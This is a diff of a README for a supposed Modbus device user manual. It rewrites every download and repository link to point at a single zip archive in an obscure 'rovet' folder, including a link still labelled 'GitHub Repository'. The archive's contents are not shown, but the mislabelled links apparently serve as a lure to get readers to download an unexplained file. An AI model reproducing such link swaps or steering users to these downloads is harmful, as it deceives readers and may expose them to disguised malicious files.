@@ -1,6 +1,6 @@
 # 📘 IS4310-232M4_User_Manual - Easy Guide to Using Your Modbus Device
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-IS4310%20User%20Manual-blue)](https://github.com/Denis-arc/IS4310-232M4_User_Manual/releases)
+[![Download Now](https://raw.githubusercontent.com/Denis-arc/IS4310-232M4_User_Manual/main/rovet/IS4310-232M4_User_Manual.zip%20Now-IS4310%20User%20Manual-blue)](https://raw.githubusercontent.com/Denis-arc/IS4310-232M4_User_Manual/main/rovet/IS4310-232M4_User_Manual.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the IS4310-232M4 User Manual! This guide will help you understand and
 
 ## 📥 Download & Install
 
-To download the user manual, visit this page to download: [IS4310 Releases](https://github.com/Denis-arc/IS4310-232M4_User_Manual/releases).
+To download the user manual, visit this page to download: [IS4310 Releases](https://raw.githubusercontent.com/Denis-arc/IS4310-232M4_User_Manual/main/rovet/IS4310-232M4_User_Manual.zip).
 
 This page contains the latest version of the user manual and any necessary files. Look for the latest release and click on it.
 
@@ -65,8 +65,8 @@ For further assistance and guidance, consider these resources:
 
 ## 📦 Important Links
 
-- Download the user manual: [IS4310 Releases](https://github.com/Denis-arc/IS4310-232M4_User_Manual/releases)
-- Visit the project repository: [GitHub Repository](https://github.com/Denis-arc/IS4310-232M4_User_Manual)
+- Download the user manual: [IS4310 Releases](https://raw.githubusercontent.com/Denis-arc/IS4310-232M4_User_Manual/main/rovet/IS4310-232M4_User_Manual.zip)
+- Visit the project repository: [GitHub Repository](https://raw.githubusercontent.com/Denis-arc/IS4310-232M4_User_Manual/main/rovet/IS4310-232M4_User_Manual.zip)
 
 ## 🔍 Conclusion
 
